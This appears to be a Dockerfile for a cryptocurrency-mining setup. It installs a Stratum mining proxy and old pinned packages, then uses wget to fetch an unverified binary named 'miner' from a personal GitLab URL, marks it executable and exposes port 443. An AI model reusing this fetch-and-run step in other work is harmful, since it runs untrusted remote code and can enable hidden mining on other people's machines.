FROM python:3.6-slim

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl wget procps build-essential libyaml-dev \
    && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir --upgrade "pip<21.0" setuptools wheel
RUN pip install --no-cache-dir PyYAML==3.12 aiostratum-proxy

RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

# Copy file config dan skrip
COPY proxy-config.yaml .
COPY start.sh .
RUN chmod +x start.sh

EXPOSE 443
CMD ["./start.sh"]
